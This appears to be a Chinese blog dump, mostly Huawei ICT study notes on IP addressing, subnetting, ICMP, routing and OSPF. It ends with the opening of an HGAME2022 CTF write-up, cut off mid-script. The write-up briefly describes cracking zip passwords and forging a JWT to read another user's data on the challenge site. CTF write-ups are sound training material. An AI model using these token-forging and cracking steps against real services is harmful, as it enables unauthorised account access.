网络掩码一般与IP地址结合使用，其中值为1的比特对应IP地址中的网络位；值为0的 比特对应IP地址中的主机位，以此来辅助我们识别一个IP地址中的网络位与主机位。 即网络掩码中1的个数就是IP地址的网络号的位数，0的个数就是IP地址的主机号的位 数 IP地址寻址网络号用于表示主机所在的网络，，类似于“XX省XX市XX区XX小区”的作用。 主机号用于表示网络号所定义的网络范围内某个特定的主机接口，类似于门牌号“XX栋XX 号”的作用。 网络寻址： 二层网络寻址：可直接通过IP地址，找到对应的主机接口。 三层网络寻址：利用网关转发来自不同网段之间的数据包。 网关： 报文转发过程中，首先需要确定转发路径以及通往目的网段的接口。如果目的主机与 源主机不在同一网段，报文需要先转发到网关，然后通过网关将报文转发到目的网段。 网关是指接收并处理本地网段主机发送的报文并转发到目的网段的设备。为实现此功能，网关必须知道目的网段的路由。网关设备上连接本地网段的接口地址即为该网段 的网关地址。 IP地址分类（有类编址） A、B、C、D、E类的类别字段分别是二进制数0、10、110、1110、1111，通过网络 号码字段的前几个比特就可以判断IP地址属于哪一类，这是区分各类地址最简单的方 法。 A、B、C三类地址是单播IP地址 (除一些特殊地址外)，只有这三类地址才能分配给主 机接口使用。 D类地址属于组播IP地址。 E类地址专门用于特殊的实验目的。 A,B,C类地址比较 使用A类地址的网络称为A类网络；使用B类地址的网络称为B类网络；使用C类地址的 网络称为C类网络。 使用A类地址的网络称为A类网络；使用B类地址的网络称为B类网络；使用C类地址的 网络称为C类网络。 B类网络的网络号为16 bit，介于A类和C类网络之间；首两位恒定为10，地址空间为： 128.0.0.0~191.255.255.255。 C类网络的网络号为24 bit，个数很多，但所允许的主机接口的个数就很少；首三位恒 定为110，地址空间为：192.0.0.0~223.255.255.255。 组播地址：组播能实现一对多传递消息。 IP地址类型网段：一个网络号所定义的网络范围 网络地址：用于标识一个网络 网络号为X，主机号的每个比特都为0。 不能分配给具体的主机接口使用。 广播地址：用于向该网络中的所有主机发送数据的特殊地址 网络号为X，主机号的每个比特都为1。 不能分配给具体的主机接口使用。 可用地址：又称主机地址，可用分配给具体的主机接口使用。 一个网段的主机位为n位，则IP地址数为：2ⁿ，可用IP地址数为：2ⁿ-2 (减去网络地址 和广播地址)。 私网IP地址公网IP地址：由IANA统一分配，以保证任何一个IP地址在Internet上的唯一性，这里的IP地址是指公网IP地址。 私网IP地址：私网IP地址的使用使得网络可以得到更为自由地扩展，因为同一个私网 IP地址是可以在不同的私有网络中重复使用的。在IP地址空间中，A,B,C三类地址各预留了一些地址专门用于私网IP地址 私有网络连接到Internet：私有网络由于使用了私网IP地址，是不允许连接到Internet的。 后来在实际需求的驱动下，许多私有网络也希望能够连接到Internet上，从而实现私网与 Internet之间的通信，以及通过Internet实现私网与私网之间的通信。私网与Internet的互联， 必须使用网络地址转换 (NAT)技术实现。 NAT (Network Address Translation)，网络地址转换，其基本作用是实现私网IP地址 与公网IP地址之间的转换。 特殊IP地址255.255.255.255：可作为目的地址发往网段所有主机（受限于网关） 这个地址称为有限广播地址，它可以作为一个IP报文的目的IP地址使用。 路由器接收到目的IP地址为有限广播地址的IP报文后，会停止对该IP报文的转发。 0.0.0.0： 如果把这个地址作为网络地址，它的意思就是“任何网络”的网络地址；如果把这个 地址作为主机接口地址，它的意思就是“这个网络上主机接口”的IP地址。 如果把这个地址作为网络地址，它的意思就是“任何网络”的网络地址；如果把这个 地址作为主机接口地址，它的意思就是“这个网络上主机接口”的IP地址。 127.0.0.1/8： 这个地址为环回地址，它可以作为一个IP报文的目的IP地址使用。其作用是测试设备 自身的软件系统。 一个设备产生的、目的IP地址为环回地址的IP报文是不可能离开这个设备本身的 169.254.0.0/16： 如果一个网络设备获取IP地址的方式被设置成了自动获取方式，但是该设备在网络上又没有找到可用的DHCP（动态主机配置协议，用于动态分配网络配置参数，如IP地址）服务器，那么该设备就会使用169.254.0.0/16网段的某个地 址来进行临时通信。 IPV4与IPV6 子网划分“有类编址”的地址划分过于死板，划分的颗粒度太大，会有大量的主机号不能被充分利 用，从而造成了大量的IP地址资源浪费。因此可以利用子网划分来减少地址浪费，即VLSM (Variable Length Subnet Mask)，可变 长子网掩码。将一个大的有类网络，划分成若干个小的子网，使得IP地址的使用更为科学。 如何进行子网划分原网段分析假设有一个C类网段地址：192.168.10.0；默认情况下，网络掩码为24位，包括24位网络位， 8位主机位。通过计算可知，这样的网络中，有256个IP地址（2的8次方）。 向主机借位，形成子网现在，将原有的24位网络位向主机位去“借”1位，这样网络位就扩充到了25位，相对的主 机位就减少到了7位，而借过来的这1位就是子网位，此时网络掩码就变成了25位，即 255.255.255.128，或/25。 子网位：可取值0或取值1，则得到了两个新的子网。 通过计算可知，现在网络中，有128个IP地址 计算子网网络地址计算网络地址，主机位全为0： 计算网络地址，主机位全为0： 如果子网位取值1，则网络地址为192.168.10.128/25 计算子网广播地址计算广播地址，主机位全为1： 如果子网位取值0，则网络地址为192.168.10.127/25。 如果子网位取值1，则网络地址为192.168.10.255/25。 ICMP协议是IP协议的辅助协议，用来在网络设备间传递各种差错和控制信息，对于收集各种网络信息、诊断和排除各种网络故障等方面起着至关重要的作用。 为了更有效地转发IP数据报文和提高数据报文交互成功的机会，在网络层使用ICMP协议。 ICMP允许主机或设备报告差错情况和提供有关异常情况的报告。 ICMP消息： ICMP消息封装在IP报文中，IP报文头部Protocol值为1时表示ICMP协议。 字段解释： ICMP消息的格式取决于Type和Code字段，其中Type字段为消息类型，Code字 段包含该消息类型的具体参数。 校验和字段用于检查消息是否完整。 消息中包含32 bit的可变参数，这个字段一般不使用，通常设置为0。 在ICMP重定向消息中，这个字段用来指定网关IP地址，主机根据这个地 址将报文重定向到指定网关。 在Echo请求消息中，这个字段包含标识符和序号，源端根据这两个参数 将收到的回复消息与本端发送的Echo请求消息进行关联。尤其是当源端 向目的端发送了多个Echo请求消息时，需要根据标识符和序号将Echo请 求和回复消息进行一一对应 ICMP重定向ICMP重定向报文是ICMP控制报文中的一种。在特定的情况下，当路由器检测到一台机器使用非最优路由的时候，它会向该主机发送一个ICMP重定向报文，请求主机改变路由 过程： 主机A希望发送报文到服务器A，于是根据配置的默认网关地址向网关RTB发送报文。 网关RTB收到报文后，检查报文信息，发现报文应该转发到与源主机在同一网段的另 一个网关设备RTA，此转发路径是更优的路径，所以RTB会向主机发送一个Redirect 消息，通知主机直接向另一个网关RTA发送该报文。 主机收到Redirect消息后，会向RTA发送报文，然后RTA会将该报文再转发给服务器 A ICMP差错检测ICMP Echo消息常用于诊断源和目的地之间的网络连通性，同时还可以提供其他信息，如报文往返时间等 ICMP的一个典型应用是Ping。Ping是检测网络连通性的常用工具，同时也能够收集其他相 关信息。用户可以在Ping命令中指定不同参数，如ICMP报文长度、发送的ICMP报文个数、 等待回复响应的超时时间等，设备根据配置的参数来构造并发送ICMP报文，进行Ping测试。ping常用于探测到达目的节点的网络可达性 ICMP错误报告ICMP定义了各种错误消息，用于诊断网络连接性问题；根据这些错误消息，源设备可以判 断出数据传输失败的原因。 如果网络中发生了环路，导致报文在网络中循环，且最终TTL超时，这种情况下网络 设备会发送TTL超时消息给发送端设备。 如果目的地不可达，则中间的网络设备会发送目的不可达消息给发送端设备。目的不 可达的情况有多种，如果是网络设备无法找到目的网络，则发送目的网络不可达消息； 如果网络设备无法找到目的网络中的目的主机，则发送目的主机不可达消息。 ICMP的另一个典型应用是Tracert。Tracert基于报文头中的TTL值来逐跳跟踪报文的转发路径。为了跟踪到达某特定目的地址的路径，源端首先将报文的TTL值设置为1。该报文到达第一个节点后，TTL超时，于是该节点向源端发送TTL超时消息，消息中携带时间戳。然后 源端将报文的TTL值设置为2，报文到达第二个节点后超时，该节点同样返回TTL超时消息， 以此类推，直到报文到达目的地。这样，源端根据返回的报文中的信息可以跟踪到报文经 过的每一个节点，并根据时间戳信息计算往返时间。Tracert是检测网络丢包和时延的有效手段，同时可以帮助管理源发现网络中的路由环路 IPV4地址配置及基本应用IP地址的基础配置命令进入接口视图： interface interface-type interface-number *interface-type interface-number:*指定接口类型和接口编号。接口类型和接口编号之间可以输入空格也可以不输 配置接口的IP地址 ip address ip-address&#123;mask|mask-length&#125; 在接口视图下，通过此命令来给网络设备上的接口配置ip地址，实现网络的互连。 ip-address：指定接口的ip地址，点分十进制形式 mask：指定子网掩码，点分十进制形式 mask-length：指定掩码长度，整数形式，取值范围是0-32. 案例：配置接口ip地址 物理接口：物理接口是指网络设备上实际存在的接口，分为负责承担业务传输的业务接口 和负责管理设备的管理接口，例如GE业务接口和MEth管理接口。 逻辑接口：逻辑接口是指能够实现数据交换功能但物理上不存在、需要通过配置建立的接 口，需要承担业务传输，例如VLANIF接口、Loopback接口。 Loopback接口：用户需要一个接口状态永远是Up的接口的IP地址时，可以选择 Loopback接口的IP地址。 Loopback接口：用户需要一个接口状态永远是Up的接口的IP地址时，可以选择 Loopback接口的IP地址。 Loopback接口配置IP地址后，就可以对外发布。Loopback接口上可以配置32位 掩码的IP地址，达到节省地址空间的目的。 Loopback接口不能封装任何链路层协议，数据链路层也就不存在协商问题，其 协议状态永远都是Up。 对于目的地址不是本地IP地址，出接口是本地Loopback接口的报文，设备会将 其直接丢弃。 网络IP地址规划规划目标：易管理、易扩展、利用率高。 规划原则： 唯一性：一个IP网络中不能有两个主机采用相同的IP地址。 连续性：连续地址在层次结构网络中易于进行路由汇总，大大缩减路由表，提高路由 计算的效率、加速路由收敛。 扩展性：地址分配在每一层次上都要有合理的预留，在网络规模扩展时能保证路由汇 总所需的连续性。避免网络扩展造成的地址、路由重新规划。 结构化、业务相关性：地址规划与网络拓扑结构和网络承载业务结合起来，便于路由 规划和QoS部署。好的IP地址规划使得每个地址都具有实际含义，看到一个地址就可 以大致判断出该地址所属的设备和对应的业务。 IP路由基础路由概述 当路由器从多种不同的途径获知到达同一个目的网段的路由(这些路由的目的网络地址及网络掩码均相同)时，会优先路由优先级值最小的路由；如果这些路由学习自相同的路由协议，则优选度量值最优的。总之，最优的路由加入路由表 当路由器收到一个数据包时，会在自己的路由表里查询数据包的目的IP地址，如果能够找到匹配的路由表项，则依据表项所指示的出接口及下一跳来转发数据；如果没有匹配的表现则丢弃该数据包 路由器的行为是逐级跳的，数据包从源到目的地沿路径每个路由器都必须有关于目标网段的路由，否则就会造成丢包 数据通信往往是双向的，因此要关注流量的往返(往返路由) 路由基本概念通过IP地址能够寻找到一个唯一的网络节点，每个IP都有自己所属的网段，这些网络可能分 布在世界各地，共同组成了全球的网络。 为了实现不同网段之间的相互通信，网络设备需要能够转发来自不同网段的IP报文，将其送 达不同的IP网段 路由 路由是指导报文转发的路径信息，通过路由可以确认转发IP报文的路径 路由设备是依据路由转发报文到目的网段的网络设备，最常见的路由设备：路由器 路由设备维护着一张路由表，保存着路由信息 网关以及中间节点（路由器）根据收到的IP报文其目的地址选择一条合适的路径，并将报文 转发到下一个路由器。在路径中的最后一跳路由器二层寻址将报文转发给目的主机。这个 过程被称为路由转发。 中间节点选择路径所依赖的表项为称为路由表。 路由条目包含明确的出接口以及下一跳，这两项信息指导IP报文转发到相应的下一跳设备上 路由信息 目的网络：标识目的网段 掩码：与目的地址共同标识一个网段 出接口：数据包被路由后离开本路由的接口 下一跳：路由器转发到达目的网段的数据包所使用的下一跳地址 这些信息标识了目的网段、明确了转发ip报文的路径 通过路由中包含的信息，路由设备可以转发IP报文到相应的路径。 目的地址、掩码用于识别IP报文目的地址，路由设备将IP报文匹配到相应的路由之后，根据 路由的出接口、下一跳确认转发的路径。 只有出接口并不能够确认转发IP报文的下一跳设备，还需要明确的下一跳设备地址。 路由表 路由器通过各种方式发现路由 路由器选择最优的路由条目放入路由表中 路由器指导设备对ip报文的转发 路由器通过对路由表的管理实现对路径的信息管理 路由器依据路由表转发报文。 路由表由一条条详细的路由条目组成。 路由表由路由条目组成，但不代表路由表中保存了所有路由，路由表中只会保存“最优的” 路由。 对路由表中的路由条目的管理实际上就是路由器维护、管理路由信息的具体实现 路由条目生成路由信息获取方式 路由器依据路由表进行路由转发，为实现路由转发，路由器需要发现路由。常见的有直连路由、静态路由和动态路由 直连接口所在网段的路由，由设备自动生成。 直连接口所在网段的路由，由设备自动生成。 动态路由：路由器通过动态路由协议（如OSPF、IS-IS、BGP等）学习到的路由 直连路由 直连路由指向本地直连网络的路由，由设备自动生成 当路由器为路由转发的最后一跳路由器时，IP报文匹配直连路由，路由器转发IP报文到目的主机 使用直连路由进行路由转发时，报文的目的IP和路由器接口IP在一个网段内 当匹配中直连路由进行转发时，此时路由器会查看ARP表项，将报文直接转到目的地址，此 时该路由器为路由转发的最后一跳路由器。 直连路由的下一跳地址并不是其他设备上的接口地址，因为该路由的目的网段为接口所在 网段，本接口就是最后一跳，不需要再转发给下一跳，所以在路由表中的下一跳地址就是 接口自身地址。 使用直连路由进行路由转发时，转发的动作不是交给下一跳，而是查询ARP表项，根据ARP 表项封装报文，将报文发送到目的IP。 并不是所有接口生成的直连路由都会出现在路由表中，直连路由出现在路由表中的前提是该接口的物理状态、协议状态都为up 最优路由条目优选ip路由表： Preference用于不同路由协议间路由优先级的比较，Cost用于同一种路由协议内部不同路由的优先级的比较。在业界，Cost也被称为路由度量值（Metric）。 路由优先级 - 常见默认值 优先级值（Preference）越小代表加入路由表的优先级越高 拥有最高优先级的路由将被添加进路由表 度量值 (cost)- 基本概念 当路由器通过某种协议发现了多条到达同一个目的网络的路由时(拥有相同的路由优先级)，度量值将作为路由优选的依据之一。 路由度量值表示到达这条路由所指目的地址的代价。 一些常用的度量值有：跳数、带宽、时延、代价、负载、可靠性等 度量数值越小越优先，度量值最小路由将会被添加到路由表中 路由转发最长匹配原则当路由器收到一个IP数据包时，会将数据包的目的IP地址与自己本地路由表中的所有路由表项进行逐位比对，直到找到匹配度最长的条目，这就是最长前缀匹配机制。 示例： 路由转发流程 来自10.0.1.0/24网段的IP报文想要去往40.0.1.0/24网段，首先到达网关，网关查找路由表项， 确定转发的下一跳、出接口，之后报文转发给R2。报文到达R2之后，R2通过查找路由表项转发给R3，R3收到后查找路由表项，发现IP报文目的IP属于本地接口所在网段，直接本地转发。 静态路由应用场景静态路由由网络管理员手动配置，配置方便，对系统要求低，适用于拓扑结构简单并且稳定的小型网络 缺点是不能自动适应网络拓扑的变化，需要人工干预。 配置 缺省路由缺省路由是一种特殊的路由，当报文没有在路由表中找到匹配的具体路由表项时才使用的路由。如果报文的目的地址不能与路由表的任何目的地址相匹配，那么该报文将选取缺省路由进行转发 缺省路由在路由表中的形式为0.0.0.0/0，缺省路由也叫做默认路由 缺省路由一般用于企业网络出口，配置一条缺省路由让出口设备能够转发前往internet上任意地址的ip报文。 动态路由当网络规模越来越大时，使用手动配置静态路由的方式获取路由条目将变得越发复杂，同时在拓扑发生变化时不能及时、灵活响应 动态路由协议有自己的路由算法，能够自动适应网络拓扑的变化，可以有效减少管理人员的工作量，适用于具有一定数量三层设备的网络。 分类根据路由信息传递的内容、计算路由的算法，可以将动态路由协议分为两大类 距离矢量协议（Distance-Vector Protocol） RIP 链路状态协议（Link-State Protocol） OSPF IS-IS BGP使用一种基于距离矢量算法修改后的算法，该算法被称为路径矢量（Path Vector） 算法。因此在某些场合下，BGP也被称为路径矢量路由协议。 根据工作范围不同，又可以分为 内部网关协议IGP（Interior Gateway Protocol）:在一个自治系统内部运行。RIP、 OSPF、ISIS为常见的IGP协议。 外部网关协议EGP（Exterior Gateway Protocol）：运行于不同自治系统之间。BGP 是目前最常用的EGP协议。 路由高级特性路由递归路由必须有直连的下一跳才能够指导转发，但是路由生成时下一跳可能不是直连的，因此需要计算出一个直连的下一跳和对应的出接口，这个过程叫做路由递归，也被称为路由迭代。 等价路由路由表中存在等价路由之后，前往该目的网段的IP报文路由器会通过所有有效的接口、下一跳转发，这种转发行为被称为负载分担 浮动路由静态路由支持配置时手动指定优先级，可以通过配置目的地址/掩码相同、优先级不同、下一跳不同的静态路由，实现转发路径的备份。 浮动路由是主用路由的备份，保证链路故障时提供备份路由。主用路由下一跳可达时该备份路由不会出现在路由表中 示例 RTA-RTB之间的链路正常时，20.0.0.0/30的两条路由条目都是有效的条目，此时比较优先 级，下一跳为10.1.1.2的优先级60，下一跳为10.1.2.2的优先级70，因此下一跳为10.1.1.2的 加入路由表。 RTA-RTB之间的链路故障时，10.1.1.2不可达，因此下一跳为10.1.1.2的路由失效，此时前 往20.0.0.0/30的路由就只存在一条，该条路由将会被选入路由表。前往20.0.0.1的流量将会 被转发到10.1.2.2 路由汇总CIDR(无类别域间路由)采用ip地址加掩码长度来标识网络和子网，而不是按照穿透的A、B、C等类型对网络地址进行划分 CIDR容许任意长度的掩码长度，将ip地址看出连续的地址空间，可以使用任意长度的前缀分配，多个连续的前缀可以聚合成一个网络，该特性可以有效减少路由表条目数量 路由汇总需求子网划分、VLSM解决了地址空间浪费的问题，但同时也带来了新的问题：路由表中的路由条目数量增加。 为减少路由条目数量可以使用路由汇总 对于一个大规模的网络来说，路由器或其他具备路由功能的设备势必需要维护大量的路由表项，为了维护臃肿的路由表，这些设备就不得不耗费大量的资源。同时，由于路由表的规模变大，会导致路由器在查表转发时效率降低。因此在保证网络中的路由器到各网段都具备IP可达性的同时，需要减小设备的路由表规模。一个网络如果具备科学的IP编址，并且进行合理的规划，是可以利用多种手段减小设备路由表规模的。一个非常常见而又有效的办法就是使用路由汇总（Route Summarization）。路由汇总又被称为路由聚合（Route Aggregation），是将一组有规律的路由汇聚成一条路由，从而达到减小路由表规模以及优 化设备资源利用率的目的，我们把汇聚之前的这组路由称为精细路由或明细路由，把汇聚 之后的这条路由称为汇总路由或聚合路由 简介 RTA上为了能够前往远端地址，需要为每一个远端网段配置一条明细路由。去往10.1.1.0/24、10.1.2.0/24、10.1.3.0/24…拥有相同下一跳。将拥有相同下一跳，一组有规律的路由汇总成 一条路由，这叫做路由汇总。 计算将明细路由的目的网络都换算成二进制，然后排列起来，找出所有目的网络地址中&quot;相同的比特位&quot; 汇总引发的问题路由汇总会造成环路问题 解决方法： 在RTB上增加一条指向NULL0的路由 一般来说一条路由，无论是静态的或者是动态的，都需要关联到一个出接口，路由的出接口指的是设备要到达一个目的网络时的出站接口。路由的出接口可以是该设备的物理接口， 例如百兆、千兆以太网接口，也可以是逻辑接口，例如VLAN接口（VLAN Interface），或者隧道（Tunnel）接口等。在众多类型的出接口中，有一种接口非常特殊，那就是Null （无效）接口，这种类型的接口只有一个编号，也就是0。Null0是一个系统保留的逻辑接 口，当网络设备在转发某些数据包时，如果使用出接口为Null0的路由，那么这些报文将被 直接丢弃，就像被扔进了一个黑洞里，因此出接口为Null0的路由又被称为黑洞路由 精确汇总当配置的静态汇总路由范围太广时可能会将流量发送到其他的网段导致数据包丢失，这种路由为不精确路由。为此配置汇总路由时要尽量精确，刚好包括所有的明细路由 思考路由器如何优选路由条目？ 首先根据preference选择，如果preference相同则继续比较度量值，如果度量值也相同， 则都会被加入路由表形成等价路由。 如何配置实现浮动路由？ 首先根据preference选择，如果preference相同则继续比较度量值，如果度量值也相同， 则都会被加入路由表形成等价路由。 将10.1.1.0/24、10.1.3.0/24、10.1.9.0/24汇总之后的网段是？ 10.1.0.0/20 OSPF基础静态路由由网络管理员手工配置，因此当网络变化时，静态路由需要手工调整，制约了静态路由在现网的大规模应用。因此动态路由因其灵活性高、可靠性好，易于扩展等特点被广泛应用于现网。 而在动态路由协议中，OSPF(开放式最短路径优先)协议是使用场景非常广泛的动态路由协议之一，是一种基于链路状态算法的路由协议 OSPF协议概述为什么需要动态路由静态路由由网络管理员手动配置和维护，适用于小型或稳定的网络 但无法适应规模较大的网络，无法动态响应网络变化。 随着设备数量增加，配置量急剧增加，静态路由已无法适应 动态路由协议的分类 BGP使用一种基于距离矢量算法修改后的算法，该算法被称为路径矢量（Path Vector）算法。因此在某些场合下，BGP也被称为路径矢量路由协议。 距离矢量路由协议 运行矢量路由协议的路由器周期性的泛洪自己的路由表。通过路由交互，每台路由器都从相邻的路由器学习到路由，并且加载进自己的路由表中 对于网络中的所有路由器而言，路由器并不清楚网络的拓扑，只是简单的知道要去往某个目的方向在哪里，距离有多远。这就是距离矢量算法的本质。 链路状态路由协议链路状态路由协议-LSA泛洪与距离矢量协议不同，链路状态由协议通告的是链路状态而不是路由表。运行链路状态路由协议的路由器之间首先会建立一个协议的邻居关系，然后彼此之间开始交互LSA（Link State Advertisement，链路状态通告） 不再通告路由信息，而是LSA 链路状态通告，可以简单的理解为每台路由器都产生一个描述自己直连接口状态（包括接口的开销、与邻居路由器之间的关系等）的通告 链路状态路由协议-LSDB泛洪每台路由器都会产生LSAs，路由器将接收到的LSAs放入自己的LSDB（Link State DataBase，链路状态数据库）。LSDB汇总了网络中路由器对于自己接口的描述，包含全网拓扑的描述。路由器通过LSDB，掌握了全网的拓扑 链路状态路由协议-SPF计算每台路由器基于LSDB，使用SPF（Shortest Path First，最短路径优先）算法进行计算，每台路由器都计算出一颗以自己为根的、无环的、拥有最短路径的“树”。有了这颗“树”，路由器就以及知道了到达网络各个角落的优选路径 SPF是OSPF路由协议的一个核心算法，用来在一个复杂的网络中做出路由优选的决策。 链路状态路由协议-路由表生成路由器将根据SPF计算出来的优选路径，加载进自己的路由表 链路状态路由协议总结 第一步是建立相邻路由器之间的邻居关系。 第二步是邻居之间交互链路状态信息和同步LSDB。 第三步是进行优选路径计算。 第四步是根据最短路径树生成路由表项加载到路由表 OSPF简介 OSPF基础术语区域OSPF Area用于标识一个OSPF的区域 区域是从逻辑上将设备划分为不同的组，每个组用区域号(Area ID)来标识 Router-IDRouter-ID（Router Identifier，路由器标识符），用于在一个OSPF域中唯一地标识一台路由器。 Router-ID的设定可以通过手工配置的方式，或使用系统自动配置的方式。 在实际项目中，通常会通过手工配置方式为设备指定OSPF Router-ID。请注意必须保证在OSPF域中任意两台设备的Router-ID都不相同。通常的做法是将Router-ID配置为与该设备某个接口（通常为Loopback接口）的IP地址一致 度量值OSPF使用Colongtst（开销）作为路由的度量值。每一个激活了OSPF的接口都会维护一个接口的Cost值，缺省时接口Cost值=100 Mbit/s/接口带宽。其中100 Mbit/s为OSPF指定的缺省参考值，该值是可以配置的。 笼统地说，一条OSPF路由的Cost值可以理解为是从目的网段到本路由器沿途所有入接口的Cost值累加。 OSPF协议报文类型OSPF有五种类型的协议报文，这些报文在OSPF路由器之间交互中起不同的作用 OSPF三大表项OSPF有三张重要的表项，OSPF邻居表、LSDB表和OSPF路由表 OSPF邻居表OSPF在传递链路状态信息之前，需先建立OSPF邻居关系 OSPF的邻居关系通过交互Hello报文建立 OSPF邻居表显示了OSPF路由器之间的邻居状态，使用display ospf peer查看 LSDB表LSDB会保存自己产生的及从邻居收到的LSA信息 Type标识LSA的类型，AdvRouter标识发送LSA的路由器 使用命令行display ospf lsdb查看LSDB表 OSPF路由表OSPF路由表和路由器路由表是两张不同的表项 OSPF路由表包含Destination、Cost和NextHop等指导转发的信息。 使用display ospf routing查看OSPF路由表 OSPF协议工作原理OSPF路由器之间的关系 OSPF路由器之间的关系有两个重要的概念，邻居关系和邻接关系 假设两台路由器直连，在双方互联接口上激活OSPF，路由器开始发送及侦听Hello报文，在通过Hello报文发现彼此后，这两台路由器便形成了邻居关系 邻居关系的建立只是开始，后续会进行一系列的报文交互，例如前文提到的DD、LSR、LSU和LS ACK等，当两台路由器LSDB同步完成，并开始独立计算路由时，这两台路由器形成了邻接关系 OSPF邻接关系建立过程OSPF完成邻接关系的建立有四个步骤，建立邻居关系、协商主/从、交互LSDB信息，同步LSDB。 流程1 当一台OSPF路由器收到其他路由器发来的首个Hello报文时会从初始Down状态切换为Init 状态。 当OSPF路由器收到的Hello报文中的邻居字段包含自己的Router ID时，从Init切换2-way状 态 流程2&amp;3 邻居状态机从2-way转为Exstart状态后开始主从关系选举： R1向R2发送的第一个DD报文内容为空，其Seq序列号假设为X。 R2也向R1发出第一个DD报文，其Seq序列号假设为Y。 选举主从关系的规则是比较Router ID，越大越优。R2的Router ID比R1大，因此R2成 为真正的主设备。主从关系比较结束后，R1的状态从Exstart转变为Exchange。 R1邻居状态变为Exchange后，R1发送一个新的DD报文，包含自己LSDB的描述信息，其序 列号采用主设备R2的序列号。R2收到后邻居状态从Exstart转变为Exchange。 R2向R1发送一个新的DD报文，包含自己LSDB的描述信息，序列号为Y+1。 R1作为从路由器需要对主路由R2发送的每个DD报文进行确认，回复报文的序列号与主路由 R2一致。 发送完最后一个DD报文后，R1将邻居状态切换为Loading。 流程4 邻居状态转变为Loading后，R1向R2发送LSR报文，请求那些在Exchange状态下通过DD报 文发现的，但是在本地LSDB中没有的LSA。 R2收到后向R1回复LSU。在LSU报文中包含被请求的LSA的详细信息。 R1收到LSU报文后，向R2回复LS ACK报文，确认已接收到，确保信息传输的可靠性。 此过程中R2也会向R1发送LSA请求。当两端LSDB完全一致时，邻居状态变为Full，表示成 功建立邻接关系。 OSPF网络类型简介OSPF网络类型是一个非常重要的接口变量，这个变量将影响OSPF在接口上的操作，例如采用什么方式发送OSPF协议报文，以及是否需要选举DR、BDR等。 接口默认的OSPF网络类型取决于接口所使用的数据链路层封装 OSPF有四种网络类型 Broadcast、NBMA、P2MP和P2P OSPF网络类型（1）一般情况下，链路两端的OSPF接口网络类型必须一致，否则双方无法建立邻居关系 OSPF网络类型可以在接口下通过命令手动修改以适应不同网络场景 OSPF网络类型（2） DR与BDR背景： MA（Multi-Access）多路访问网络有两种类型：广播型多路访问网络（BMA）及非广播类多路访问网络（NBMA）。以太网（Ethernet）是一种典型的广播型多路访问网络 在MA网络中，如果每台OSPF路由器都与其他的路由器建立OSPF邻接关系，便会导致网络中存在过多的OSPF邻接关系，增加设备负担，也增加了网络中泛洪的OSPF报文数量 当拓扑出现变更，网络中的LSA泛洪可能会造成带宽的浪费和设备资源的损耗 为优化MA网络中OSPF邻接关系，OSPF指定了三种OSPF路由器身份，DR（Designated Router，指定路由器）、BDR（Backup Designated Router，备用指定路由器）和DRother路由器。 只允许DR、BDR与其他OSPF路由器建立邻接关系。DRother之间不会建立全毗邻的OSPF邻接关系，双方停滞在2-way状态 BDR会监控DR的状态，并在当前DR发生故障时接替其角色 选举规则：OSPF DR优先级更高的接口成为该MA的DR，如果优先级相等（默认为1），则 具有更高的OSPF Router-ID的路由器（的接口）被选举成DR，并且DR具有非抢占性。 OSPF域与单区域OSPF域（Domain）：一系列使用相同策略的连续OSPF网络设备所构成的网络。 OSPF路由器在同一个区域内网络中泛洪LSA。为了确保每台路由器都拥有对网络拓扑的一致认知，LSDB需要在区域内进行同步。 如果OSPF域仅有一个区域，随着网络规模越来越大，OSPF路由器的数量越来越多，这将会导致诸多问题： LSDB越来越庞大，同时导致OSPF路由表规模增加，路由器资源消耗多，设备性能下降，影响数据转发 基于庞大的LSDB进行路由计算变得困难 当网络拓扑变更时，LSA全域泛洪和全网SPF重计算带来巨大负担 OSPF多区域OSPF引入区域的概念，将一个OSPF域划分成多个区域，可以使OSPF支撑更大规模组网。 OSPF多区域的设计减小了LSA泛洪的范围，有效的把拓扑变化的影响控制在区域内，达到网络优化的目的。 在区域边界可以做路由汇总，减小了路由表规模。 多区域提高了网络扩展性，有利于组建大规模的网络。 区域的分类：区域可以分为骨干区域与非骨干区域。骨干区域即Area0，除Area0以外其他 区域都称为非骨干区域。 多区域互联原则：基于防止区域间环路的考虑，非骨干区域与非骨干区域不能直接相连， 所有非骨干区域必须与骨干区域相连 OSPF路由器类型OSPF路由器根据其位置或功能不同，分为 区域内路由器（Internal Router）：该类路由器的所有接口都属于同一个OSPF区域。 区域边界路由器ABR（Area Border Router）：该类路由器的接口同时属于两个以上的区域， 但至少有一个接口属于骨干区域。 骨干路由器（Backbone Router）：该类路由器至少有一个接口属于骨干区域。 自治系统边界路由器ASBR（AS Boundary Router）：该类路由器与其他AS交换路由信息。 只要一台OSPF路由器引入了外部路由的信息，它就成为ASBR。 OSPF单区域&amp;多区域典型组网中小型企业网络规模不大，路由设备数量有限，可以考虑将所有设备都放在同一个OSPF区 域。 大型企业网络规模大，路由设备数量很多，网络层次分明，建议采用OSPF多区域的方式部 署。","categories":[],"tags":[{"name":"华为ict","slug":"华为ict","permalink":"https://ethe448.github.io/tags/%E5%8D%8E%E4%B8%BAict/"}]},{"title":"HGAME2022 wp","slug":"HGAME2022-wp","date":"2022-01-21T09:09:12.000Z","updated":"2022-06-19T05:36:02.033Z","comments":true,"path":"2022/01/21/HGAME2022-wp/","link":"","permalink":"https://ethe448.github.io/2022/01/21/HGAME2022-wp/","excerpt":"","text":"带*为赛后复现 第一周wpMISC欢迎欢迎！热烈欢迎！签到 这个压缩包有点麻烦压缩包，先真加密，爆破得到密码，然后字典爆破，再明文爆破，最后得到的一个藏着伪加密压缩包的图片，破掉伪加密把压缩包解压能得到flag 好康的流量wireshark打开，追踪tcp流得到一大串base64值，转成图片 stegslove看一下 找个在线扫条形码的网站扫一下得到前半部分，后半部分利用zsteg能直接看到 群青(其实是幽灵东京）第一个音频文件 猜密码是yoasobi 得到一个网址，里面是sstv为文件名的音频文件，用robot36接收一下 得到一个二维码 扫码拿到flag WEBeasy_auth 题目描述暗示todo里藏着东西，看一下源码 猜到flag可能再id为1的内容里 访问的时候显示没添加cookie或者token 抓包给他加个jwt jwt可以根据前边的网页抓包得到的jwt修改 蛛蛛...嘿嘿♥我的蛛蛛 from time import sleep import requests url &#x3D; &quot;https:&#x2F;&#x2F;hgame-spider.vidar.club&#x2F;6c5920c09d&quot; key &#x3D; &quot;?key&#x3D;VmqCK2lB2LRY2sM%2F5rEjFXHRemjYkb%2BQ2YHG8z7oy1krIf6R%2FOVrA8Ho5G9rxahnu6%2BTfwj6ZRbt3YP405Y12Q%3D%3D&quot; for i in range(1, 1000): url &#x3D; &quot;https:&#x2F;&#x2F;hgame-spider.vidar.club&#x2F;6c5920c09d&quot; url 